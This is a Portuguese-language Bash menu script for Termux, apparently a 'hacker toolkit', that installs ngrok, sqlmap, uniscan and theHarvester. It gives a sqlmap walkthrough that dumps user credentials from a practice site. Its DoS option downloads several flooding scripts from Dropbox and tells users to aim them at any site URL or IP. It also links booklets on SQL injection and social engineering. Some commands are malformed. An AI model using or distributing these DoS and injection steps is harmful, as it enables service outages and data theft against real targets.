#!/bin/bash
#Døff CORES 

preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"
branco="\033[1;37m"






clear
echo "iniciando..."
clear
sleep 1.5
echo "$branco Scipt coded at $vermelho Termux.\n\n";
echo "$verdeClaro  QUAL SEU CODE NOME? \n\n";
read -p ">" nome
clear
echo "$amarelo Seja Bem Vindo $verde $nome $branco :*(AGUARDE)*:\n\n";
sleep 1.5


echo "$cyan script coded by:$vermelho
██████╗ ██████╗ ███████╗███████╗
██╔══██╗██╔═══██╗██╔════╝██╔════╝
██║ ██║██║ ██║█████╗ █████╗  
██║ ██║██║ ██║██╔══╝ ██╔══╝  
██████╔╝╚██████╔╝██║ ██║     
╚═════╝ ╚═════╝ ╚═╝ ╚═╝     
\n\n";                              

sleep 0.5

#Inicio
echo "$branco -1-Open the Menu($cyan ferramentas)\n\n";
echo "$purple -2 Open the Menu($cyanClaro Estudo)\n\n";
echo "$vermelho -3 Information of Device\n\n";
echo "$azul -4 Encoder MD5\n\n";
read -p ">" menu

if [ "$menu" = "3" ]
        then
                clear
                apt-get install screenfetch
                screenfetch
                sleep 5.5
                sh doff.sh

elif [ "$menu" = "4" ]
      then 
            clear
	    apt-get install python
	    pip install --upgrade
	    pip install tqdm
	    python encoder.py

elif [ "$menu" = "1" ]
        then
		clear
		sleep 0.5

		#Menu
		clear
		echo "$vermelho
 ███╗ ███╗███████╗███╗ ██╗██╗ ██╗
████╗ ████║██╔════╝████╗ ██║██║ ██║
██╔████╔██║█████╗ ██╔██╗ ██║██║ ██║
██║╚██╔╝██║██╔══╝ ██║╚██╗██║██║ ██║
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
╚═╝ ╚═╝╚══════╝╚═╝ ╚═══╝ ╚═════╝ 
$branco 
 ██████╗ ███╗ ██╗███████╗
██╔═══██╗████╗ ██║██╔════╝
██║ ██║██╔██╗ ██║█████╗  
██║ ██║██║╚██╗██║██╔══╝  
╚██████╔╝██║ ╚████║███████╗
 ╚═════╝ ╚═╝ ╚═══╝╚══════  \n\n";
				  				  							 
				  				  							 
		echo "\n" 
		echo " \033[0;37m		---01---INSTALAR NGROK------01 \033[0m\n"
		echo " \033[0;37m		---02---INSTALAR PACOTES BASICOS---02 \033[0m\n"
		echo " \033[0;37m		---03---INSTALAR SQLMAP------------03 \033[0m\n"
		echo " \033[0;37m		---04---INSTALAR UNISCAN-----------04 \033[0m\n"
		echo " \033[0;37m		---05---VISITAR MEU CANAL----------05 \033[0m\n"
		echo " \033[0;37m		---06---APOSTILAS------------------06\033[0m\n"
		echo " \033[0;37m		---07---SCRIPTS DE DoS------------07\033[0m\n"
      	echo " \033[0;37m		---08---INSTALAR THE-HARVESTER-------08\033[0m\n"
		echo "$verde    --0--Volta--0-- \n\n";			 
		echo "\n >> "; read at 

	#Volta
	if [ "$at" = "0" ]
		then
			 sh doff.sh

elif [ "$at" = "8" ]
 then
clear 
			echo "$amarelo Baixar TheHarvester  s/para instalar n/para aprender a usar
0 Para sair\n\n";
 read fde

if [ "$fde" = "0" ]
			then
   clear

sh doff.sh
		elif [ "$fde" = "s" ]
			then
				
clear 
   echo "$vermelho INSTALANDO [Aguarde...] \n\n";			
    apt-get install unzip
    apt-get install python-requests     
    apt-get install wget
     wget -c -P '$HOME' https://www.dropbox.com/s/7s0kw75qc6u0no0/th.zip

    cd $HOME && unzip th.zip
    cd $HOME  && chmod a+x th.py 

   echo "$vermelho CONCLUIDO! \n\n";			
  sleep 0.5
     clear 

echo "$amarelo Agora vamos aprender a usar: 
	 comando \n\n";

        echo "$verde python th.py -d testphp.vulnweb.com -l 1000 -b all \n\n";	
    
     echo "$purpleClaro -d = Dominio

 -b = Aonde ele ira procurar(BING,GOOGLE,etc..) ou use all para usar todas as opcoes. 
   
-l = Limite de resultados \n\n";			

echo "$marrom o Google acha : \n\n";			

echo "$amarelo  E-mails, sub-dominios; 
Perfis no Google+:
 Nomes de funcionarios \n\n";			
 
echo "$cyan o Bing acha : \n\n";			

echo "$verdeClaro  Bing: E-mails;
 sub-dominios/hostnames
 virtualhosts \n\n";			
 
echo "$branco --0--VOLTA--0-- \n\n";			
read ey

		if [ "$ey" = "0" ]
			then
 sh doff.sh 
		else
			echo "Digite uma opcao correta"
	
fi


		elif [ "$fde" = "n" ]
			then
				
    echo "$amarelo Agora vamos aprender a usar: 
	 comando \n\n";

        echo "$verde python th.py -d testphp.vulnweb.com -l 1000 -b all \n\n";	
    
     echo "$purpleClaro -d = Dominio

 -b = Aonde ele ira procurar(BING,GOOGLE,etc..) ou use all para usar todas as opcoes. 
   
-l = Limite de resultados \n\n";			

echo "$marrom o Google acha : \n\n";			

echo "$amarelo  E-mails, sub-dominios; 
Perfis no Google+:
 Nomes de funcionarios \n\n";			
 
echo "$cyan o Bing acha : \n\n";			

echo "$verdeClaro  
 E-mails;
 sub-dominios/hostnames
 virtualhosts \n\n";		

echo "$vermelho pronto  agora  voce ja sabe o basico do the harvester! \n\n";			
 fi
echo "$branco --0--VOLTA--0-- \n\n";			
read pqp
		if [ "$pqp" = "0" ]
			then
    sh doff.sh 
		else
			echo "Digite uma opcao correta"
	fi	
#Source 
	elif [ "$at" = "1" ]
		then 

			echo "$vermelho Bom, agora vamos instalar o arquivo do Ngrok,enquanto isso acesse esse site e crie uma conta $verde https://dashboard.ngrok.com/user/signup\n\n";

			sleep 2.7

			apt-get install wget
			apt-get install unzip
            wget -P -C $HOME https://www.dropbox.com/s/1gsuh5d462loahi/ngrok?dl=0
			
			clear
			echo "$purple INSTALADO PARA USAR BASTA DAR ./ngrok tcp e a porta ou se for um servidor http de ./ngrok http e a porta/n/n";

		    sleep 3.0
			sh doff.sh

      


	#ddos
	elif [ "$at" = "7" ]
		then

			echo "$amarelo Baixar os scripts de DoS s/para instalar n/aprender a usar 0/para sair /n \n\n"; read kae

		if [ "$kae" = "0" ]
			then
 sh doff.sh 

		elif [ "$kae" = "n" ]
			then
				clear 				echo "$amarelo Pronto!  Agora vamos como usar, Abre outra janela e digita: \n\n";
				echo "$branco 
				cd 
				python HttpDoser.py 
				\n\n";
				echo "$amarelo Agora  voce vai ver o símbolo  do script bem grande!  Para usar basta digitar :
				python HttpDoser.py  url do  site
				\n\n";
             echo "$amarelo O modo de uso dos scripts  e o mesmo: 		\n\n";
             echo "$vermelho python Canon.py  url do site
          python Sadattack.py url do site
          python SadDos.py url do site 				\n\n";
				echo "$verde --0--VOLTA--- \n\n";
				read jpq

				if [ "$jpq" = "0" ]
					then
						cd && sh doff.sh

				fi
		

		elif [ "$kae" = "s" ]
			then
				clear
				sleep 0.5 
				echo "$vermelho   Baixando [Aguarde...] \n\n";
				apt-get install python
				apt-get install wget 
            apt-get install perl
				wget -c -P '$HOME' https://www.dropbox.com/s/yj59ha6bqz6gwso/Canon.py 
				wget -c -P '$HOME' https://www.dropbox.com/s/4w168hgniztu86z/HttpDoser.py
				 wget -c -P '$HOME' https://www.dropbox.com/s/uf5t1j30q0edylc/Sadattack.py
				wget -c -P /home  https://www.dropbox.com/s/wgdivajy1hy44t2/sadDos.py
           wget -c -P /home https://www.dropbox.com/s/x3m7ptr0sx02jfc/Klez.pl
				clear
				
				clear
				echo "$amarelo Pronto!  Agora vamos como usar, Abre outra janela e digita: \n\n";
				echo "$branco 
				cd 
				python HttpDoser.py 
				\n\n";
				echo "$amarelo Agora  voce vai ver o símbolo  do script bem grande!  Para usar basta digitar :
				python HttpDoser.py  url do  site
				\n\n";
             echo "$amarelo O modo de uso dos scripts  e o mesmo: 		\n\n";
             echo "$vermelho python Canon.py  url do site
          python Sadattack.py url do site
          python SadDos.py url do site 				\n\n";
           echo "$verdeClaro Para DoS em ip use o script  klez.pl! Veja    o modo de uso: 
     cd
    perl Klez.pl ip 				\n\n";
				echo "$verde --0--VOLTA--- \n\n";
				read jpq

				if [ "$jpq" = "0" ]
					then
						cd && sh doff.sh
				fi
		else
			echo "Digite uma opcao correta"
		
		fi #Fim da variavel kae
#Packs
	elif [ "$at" = "2" ] #inicia 2 opção 
		then

			echo "\033[1;31mInstalando Pacotes Basicos [Aguarde...]\033[1;33m"

			sleep 0.5

			apt-get install python 
			apt-get install python3
			apt-get install vim 
			apt-get install wget
			apt-get install nano
			apt-get install git
			apt-get install perl
			apt-get install python-requests
			apt-get install libany-uri-escape-perl 
			apt-get install libhtml-html5-entities-perl
			apt-get install libhtml-entities-numbered-perl  
			apt-get install libhtml-parser-perl  
			apt-get install libwww-perl
			echo "\033[1;35mConcluido!"

			sleep 2
			
			sh doff.sh

			


#inicia 3 opção
	elif [ "$at" = "3" ] 
		then
			echo "\033[1;31mInstalando SQLMAP [Aguarde...]\033[1;33m"

			apt-get install python 
			git clone https://github.com/sqlmapproject/sqlmap
			cd sqlmap
			chmod +x sqlmap.py
			mv sqlmap.py /data/data/com.termux/files/home

			echo "\033[1;35mConcluido!"
			sleep  0.6
			clear
			echo "$amarelo Pronto!  Agora vamos aprender a usar:(quando for usar de cd sqlmap e faça  a execução  com python2 sqlmap.py ou ./sqlmap.py \n\n";
			echo "$vermelho
python2 sqlmap.py -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –dbs
sqlmap : Para execultar  a ferramenta! 
-u : Define o endereco do site!
–dbs : Lista o banco de dados do site! 
\n\n";		
			echo "$branco Prosseguir? s/n "; read pika			
			
				if [ "$pika" = "s" ] 
					then
						clear
						sleep 0.5
						echo "$amarelo  Apos um tempo ate ele achar a vulnerabilidade  vera estes  dois bancos de dados:"

						echo "$verde [*] acuart \n\n";

						echo "$vermelho [*] information_schema \n\n";

						echo "$amarelo comando 
python2 sqlmap.py -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –dbs -D acuart –tables

-D : Define o banco de dados que sera avaliado!

acuart : Banco de dados do site que estamos testando!

–tables : Lista  as tabelas do banco de dados \n\n";

						echo "$amarelo Nota: todo banco de dados Mysql tem  esse \n\n"; echo "$vemelho [*] information_shema \n\n"; echo "$amarelo mas nao e esse nosso foco! \n\n";
				
				elif [ "$pika" = "n" ]
					then
						clear && exit
				
				fi #Fun da variavel pika
				
				echo "$branco  Prosseguir? s/n"
				read kkk			
					if [ "$kkk" = "s" ] 
						then
							clear 
							sleep 0.5
							echo "$amarelo Como pode  ver  abaixo ele listou todas as tabelas do banco de dados ! \n\n";

							echo "$verde  

+ artists
+ carts
+ categ
+ featured
+ guestbook
+ pictures
+ products
+ users \n\n";

							echo "$amareloAgora pode escolher qual coluna quer, veja o comando abaixo: \n\n";

							echo "$azul
python2 sqlmap.py -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –dbs -D acuart -T users –columns

-T : Define qual tabela deseja avaliar 

users : Tabela que eu escolhi avaliar

–columns : Lista quais  informacoes possuem a tabela escolhida \n\n";
							  
							echo "$purpleClaro  como pode ver o resultado  e: \n\n";

							echo "$verde
+ address
+ cart
+ cc
+ email
+ name
+ pass
+ phone
+ uname
\n\n";

							
				echo "$branco  Prosseguir? s/n"
				read njh			
					if [ "$njh" = "s" ] 
						then 
echo "$azul agora  vamos extrair as informacoes  dessas colunas \n\n";

echo "$amarelo as colunas que podemos interagir  sao: \n\n";

                 echo "$verde 


+ address
+ cart
+ cc
+ email
+ name
+ pass
+ phone
+ uname \n\n";

echo "$amarelo entao o comando  que se deve para pegar essas informacoes  e: \n\n";

echo "$verde
python2 sqlmap.py -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –dbs -D acuart -T users -C name,pass,uname,email –dump

-C : Define as colunas que serao avaliadas

[que no caso e
name,pass,uname,email : Lista de dados que eu escolhi  avaliar .]

–dump : Extrai as informacoes  informadas \n\n";

echo "$vermelho  como pode ver o resultado  e :


pass: test

name: John Smith

uname: test

email: email@email.com \n\n";

 echo "$verde Agora voce ja sabe o basico sobre sqlmap.
oBs:o site usado ja e proprio  para isso!  Faca o teste tambem. \n\n";
fi
 echo "$amarelo --0--VOLTA--0-- \n\n";
   read gsew
					if [ "$gsew" = "0" ] 
						then
							clear 
							sleep 0.5
        cd && sh doff.sh

								else
									echo "DIGITE UMA OPCAO CORRETA"

								fi #Fim da variavel gh
					elif [ "$nh" = "n" ]
						then
							clear && exit

					else
						echo "Digite uma opcao correta"
	
					fi #Fim da variavel kkk
	
	
	
	elif [ "$at" = "4" ] #inicia 4 opção 
		then

			echo "\033[1;31mInstalando UNISCAN [Aguarde...]\033[1;33m"

			apt-get -y install libmoose-perl   Build-essential libany-uri-escape-perl libhtml-html5-entities-perl libhtml-entities-numbered-perl libhtml-parser-perl libwww-perl wget
			cd /data/data/com.termux/files/home
			wget -P '$HOME' http://downloads.sourceforge.net/project/uniscan/6.2/uniscan6.2.tar.gz
			tar -vzxf uniscan6.2.tar.gz 

			cd uniscan6.2
			chmod +x uniscan.pl

			clear
			echo "$vermelho agora vamos  aprender a usar: \n\n";
			echo "$purple os paramentros que podemos usar são:  \n\n";
			echo "$branco:
			-h help
			-u define a url
			-f lê um arquivo com urls ./uniscan.pl -f lista.txt
			-b Faz o uniscan rodar em segundo plano
			-w Checagem de arquivos
			-d checagem dinâmica
			-s checagem estática\n\n";
			echo "$vermelho  comando $verde perl uniscan.pl -u http://testphp.vulnweb.com/ -qwdse/n/n";
			echo "$branco perl uniscan.pl para executar  a ferramenta
			-u para definir a url
			qwdse q=para checar diretorios w= checagem de arquivos d= para uma checagem dinâmica e s=para uma checagem estática/n/n";
			sleep 50
			sh doff.sh


	#inicia 5 opção 
	elif [ "$at" = "5" ] 
		then

			echo "   \033[0;33mVISITE MEU CANAL- https://www.youtube.com/channel/UCr4HOq5R5Y540-dqYzGoqIQ\033[0m"
			echo "   \033[0;33m     REDES SOCIAS:
Whatsapp - +55 41 99677 4152
Facebook - Doff
Telegram - @Doff123 \033[0m"

			sleep 8
			sh doff.sh


	sleep 2
	#inicia 6 opção 
	elif [ "$at" = "6" ] 
		then
			clear
			clear
			clear

echo "\033[1;31m  
     _    ____   ___  ____ _____ ___ _        _    ____  
   / \  |  _ \ / _ \/ ___|_   _|_ _| |      / \  / ___| 
  / _ \ | |_) | | | \___ \ | |  | || |     / _ \ \___ \ 
 / ___ \|  __/| |_| |___) || |  | || |___ / ___ \ ___) |
/_/   \_\_|    \___/|____/ |_| |___|_____/_/   \_\____/ \033[0m" 

			echo " \033[0;33m		---01---BAIXAR APOSTILA = PYTHON-01 \033[0m\n"
			echo " \033[0;33m		---02---BAIXAR APOSTILA = SQL INJECTION -02 \033[0m\n"
			echo " \033[0;33m		---03---BAIXAR APOSTILA = APACHE-PHP-MYSQL-03 \033[0m\n"
			echo " \033[0;33m		---04---BAIXAR APOSTILA =ENGENARIA SOCIAL-04 \033[0m\n"
			echo " \033[0;33m		---05----BAIXAR APOSTILA =HTML & CSS-05 \033[0m\n"
			echo " \033[0;33m		---06---BAIXAR APOSTILA =ANALISE DE VULL-06\033[0m\n"
			echo "\n >> "; read aj



				if [ "$aj" = "1" ] 
					then
						echo "\033[1;31mBaixando apostila [Aguarde...]\033[1;33m"

						apt-get install  wget

						wget -c '$HOME' https://www.dropbox.com/s/if4b3m4hcndodic/Apostila%20B%C3%A1sico%20Python-1-1-1-1.pdf?dl=0

      mv Apostila Básico Python-1-1-1-1.pdf?dl=0 Apostila Básico Python.pdf

						echo "\033[1;31mAPOSTILA BAIXADA NA PASTA HOME DE SEU GNU!\033[1;33m"
						sleep 2
						
						sh doff.sh 


				#inicia 2 opção 
				elif [ "$aj" = "2" ] 
					then
						echo "\033[1;31mBaixando apostila [Aguarde...]\033[1;33m"
						apt-get install wget

						wget -c /data/data/com.termux/files/home https://www.dropbox.com/s/3k9jg5iryzgp3b2/A%20Injecao%20SQL-Invasao-com.pdf?dl=0
        mv A Injecao SQL-Invasao-com.pdf?dl=0 A Injecao SQL-Invasao-com.pdf


						echo "\033[1;31mAPOSTILA BAIXADA NO diretorio /data/data/com.termux/files/\033[1;33m"
						sleep 2

						sh doff.sh 

				#inicia 3 opção 
				elif [ "$aj" = "3" ] 
					then
						echo "\033[1;31mBaixando apostila [Aguarde...]\033[1;33m"
						apt-get install wget
						wget -C -P '$HOME' https://www.dropbox.com/s/35zxrwo07xwa2t0/Apache%20%2B%20PHP%20%2B%20MySQL%20
%20Fernando%20Lozano.pdf?dl=0

mv Apache + PHP + MySQL - Fernando Lozano.pdf?dl=0 Apache + PHP + MySQL - Fernando Lozano.pdf

						echo "\033[1;31mAPOSTILA BAIXADA NA PASTA HOME !\033[1;33m"
						sleep 2
	
						sh doff.sh 

				#inicia 4 opção 
				elif [ "$aj" = "4" ] 
					then
						echo "\033[1;31mBaixando apostila [Aguarde...]\033[1;33m"
						apt-get install wget 
						wget -P '$HOME' https://www.dropbox.com/s/35zxrwo07xwa2t0/Apache%20%2B%20PHP%20%2B%20MySQL%20-%20Fernando%20Lozano.pdf?dl=0


						echo "\033[1;31mAPOSTILA BAIXADA \033[1;33m"
						sleep 2

						sh doff.sh 

				#inicia 5 opção 
				elif [ "$aj" = "5" ] 
					then
						echo "\033[1;31mBaixando apostila [Aguarde...]\033[1;33m"
						apt-get install wget 
						wget https://www.dropbox.com/s/7tlv742cvv75dq1/Apostila%20de%20HTML%20e%20CSS.pdf?dl=0
 mv Apostila de HTML e CSS.pdf?dl=0 Apostila de HTML e CSS.pdf

						echo "\033[1;31mAPOSTILA BAIXADA\033[1;33m"
						sleep 2

						sh doff.sh 

				#inicia 6 opção 
				elif [ "$aj" = "6" ] 
					then
						echo "\033[1;31mBaixando apostila [Aguarde...]\033[1;33m"
						apt-get install wget 
						wget -P '$HOME'  https://www.dropbox.com/s/c80hhq7qyg7svyb/Analise%20de%20vulnerabilidades%20a%20rede%20sem%20fio-1.pdf
  mv Analise de vulnerabilidades a rede sem fio-1.pdf?dl=0 Analise de vulnerabilidades a rede sem fio-1.pdf


						echo "\033[1;31mAPOSTILA BAIXADA \033[1;33m"
						sleep 2

						sh doff.sh 
						
				else
						echo "Digite uma opcao correta"

				fi #Fim da variavel aj
				
	else
		echo "Digite uma opcao correta"
	
	fi #Fim da variavel at



elif [ "$menu" = "2" ]
	then
		clear
		echo "$vermelho


███╗ ███╗███████╗███╗ ██╗██╗ ██╗
████╗ ████║██╔════╝████╗ ██║██║ ██║
██╔████╔██║█████╗ ██╔██╗ ██║██║ ██║
██║╚██╔╝██║██╔══╝ ██║╚██╗██║██║ ██║
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
╚═╝ ╚═╝╚══════╝╚═╝ ╚═══╝ ╚═════╝ 
$purple 

████████╗██╗ ██╗ ██████╗ 
╚══██╔══╝██║ ██║██╔═══██╗
   ██║ ██║ █╗ ██║██║ ██║
   ██║ ██║███╗██║██║ ██║
   ██║ ╚███╔███╔╝╚██████╔╝
   ╚═╝ ╚══╝╚══╝ ╚═════╝ 
                                                                   \n\n";
			   
																	   
						 
		echo "\n" 
		echo " \033[0;33m		---01---Oque e SOURCE LIST?------01 \033[0m\n"
		echo " \033[0;33m		---02---Oque e SQLMAP?------------02 \033[0m\n"
		echo " \033[0;33m		---03---Oque e o UNISCAN?-----------03 \033[0m\n"
		echo " \033[0;33m		---04---Oque e DDO'S?----------04 \033[0m\n"
       echo " \033[0;33m		---05---Oque e o TheHarvester ?----------05 \033[0m\n"
		echo "$verde    --0--Volta--0-- \n\n";
		echo "\n >> ";
		read lala


			if [ "$lala" = "0" ]
				then
					clear
					sleep 0.5 
				    sh doff.sh

			elif [ "$lala" = "5" ]
				then
					clear
					sleep 0.5 
echo "$branco [ Apos ler espere ser redirecionado ] \n\n";			

echo "$verde theHarvester -Coleta de informacoes \n\n";			
  echo "$purpleClaro  

O theHarvester e uma otima ferramenta de coleta de informacoes de um determinado host, com ela e possivel obter uma relacao de e-mails, subdominios, hosts, nomes de funcionarios, portas abertas, banners de diferentes fontes publicas, chaves PGP e ainda as informacoes mapeadas pelo  SHODAN. \n\n";			

sleep 15.0
 sh doff.sh


			elif [ "$lala" = "4" ]
				then
					clear
					sleep 0.5 


echo "$vermelho

     _      _____   _____      _       ____   _  __
    / \    |_   _| |_   _|    / \     / ___| | |/ /
   / _ \     | |     | |     / _ \   | |     | ' / 
  / ___ \    | |     | |    / ___ \  | |___  | . \ 
 /_/   \_\   |_|     |_|   /_/   \_\  \____| |_|\_\
             


         
  ____    ____     ___    _   ____  
 |  _ \  |  _ \   / _ \  ( ) / ___| 
 | | | | | | | | | | | | |/  \___ \ 
 | |_| | | |_| | | |_| |      ___) |
 |____/  |____/   \___/      |____/ \n\n";
          		

					echo "$branco (APOS LER ESPERE SER REDIRECIONADO)\n\n";


					echo "$amarelo O ataque do tipo DoS (Denial Of Service, em ingles), tambem conhecido como ataque de negacao de servico, e uma tentativa de fazer com que aconteca uma sobrecarga em um servidor ou computador comum para que recursos do sistema fiquem indisponiveis para seus utilizadores. \n\n";

					sleep 13.00
					sh doff.sh






			elif [ "$lala" = "3" ]
				then
					clear
					sleep 0.5 
					 echo "$vermelho



  _   _   _   _   ___   ____     ____      _      _   _ 
 | | | | | \ | | |_ _| / ___|   / ___|    / \    | \ | |
 | | | | |  \| |  | |  \___ \  | |       / _ \   |  \| |
 | |_| | | |\  |  | |   ___) | | |___   / ___ \  | |\  |
  \___/  |_| \_| |___| |____/   \____| /_/   \_\ |_| \_| \n\n";
        

					echo "$branco (APOS LER ESPERE SER REDIRECIONADO)\n\n";

					echo "$cinzaClaro 

					O Uniscan e uma ferramenta  desenvolvida  em perl , usada para testes de penetração para buscar vulnerabilidades  em sites que busca por falhas
					SQL INJECTION, XSS, Blind sql entre outros... \n\n";
					sleep 15.0
				    sh doff.sh



			elif [ "$lala" = "2" ]
				then
					clear
					sleep 0.5 
					 echo "$amarelo

____     ___    _               __  __      _      ____  
 / ___|   / _ \  | |             |  \/  |    / \    |  _ \ 
 \___ \  | | | | | |      _____  | |\/| |   / _ \   | |_) |
  ___) | | |_| | | |___  |_____| | |  | |  / ___ \  |  __/ 
 |____/   \__\_\ |_____|         |_|  |_| /_/   \_\ |_|               
             \n\n";


					echo "$branco (APOS LER ESPERE SER REDIRECIONADO)\n\n";



					echo "$cyanClaro 

					Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades a Injeção de SQL, este software bastante conhecido é utilizado geralmente por Cracker! \n\n";

					sleep 15.0 
				    sh doff.sh






			elif [ "$lala" = "1" ]
				then
					clear
					sleep 0.5
					  echo "$azul

           ____     ___    _   _   ____     ____   _____ 
 / ___|   / _ \  | | | | |  _ \   / ___| | ____|
 \___ \  | | | | | | | | | |_) | | |     |  _|  
  ___) | | |_| | | |_| | |  _ <  | |___  | |___ 
 |____/   \___/   \___/  |_| \_\  \____| |_____|
                    

 _       ___   ____    _____ 
 | |     |_ _| / ___|  |_   _|
 | |      | |  \___ \    | |  
 | |___   | |   ___) |   | |  
 |_____| |___| |____/    |_|  \n\n";
                        


					  echo  "$verde  source list como o nome ja diz e a lista de fontes, ou seja e a lista de servidores que contem os pacotes para a instalacao pelo apt.   \n\n";

					echo " $amarelo Deseja saber mais? s/n \n\n";
					read psn

						if [ "$psn" = "n" ]
							then
								clear
								sleep 0.5 
							 sh doff.sh



						elif [ "$psn" = "s" ]
							then
								clear
								sleep 0.5





echo "$amarelo


      _      ____    _____ 
    / \    |  _ \  |_   _|
   / _ \   | |_) |   | |  
  / ___ \  |  __/    | |  
 /_/   \_\ |_|       |_|  \n\n";
                

	   

								echo "$branco (APOS LER ESPERE SER REDIRECIONADO)\n\n";



								echo "$verde O APT é usado principalmente no Debian e em seus derivados. O APT é uma biblioteca de rotinas que agem como uma interface para o dpkg, que é um gerenciador de pacotes de baixo nível (no sentido de programação, e não de qualidade) que permite instalar, desinstalar e atualizar pacotes .deb. O APT traz funções avançadas ao dpkg, dentre as quais está a resolução de dependências. O APT de hoje trilhou um longo caminho desde suas origens, mas manteve seu parentesco com o dpkg. Todos os derivados do Debian usam o APT por padrão. O desenvolvimento de novas capacidades tem se mantido num ritmo semelhante ao de outros gerenciadores de pacotes mais recentes. Não há como duvidar que o APT é um dos melhores e mais completos gerenciadores de pacotes. O APT já foi portado para o OpenSolaris e o Mac OS X, e pode ser usado em distribuições baseadas em RPM por meio do apt4rpm ou do apt-rpm. \n\n";
								  

								     
								sleep 15.0


					 sh doff.sh
						else
							echo "Digite uma opcao  correta"
	
						fi #Fim da variavel psn
		
			
			else
				echo "Digite uma opcao correta"
	
			fi #Fim da variavel lala
			
			
			
			
else
	echo "Digite uma opcao correta"

fi #Fim da variavel menu
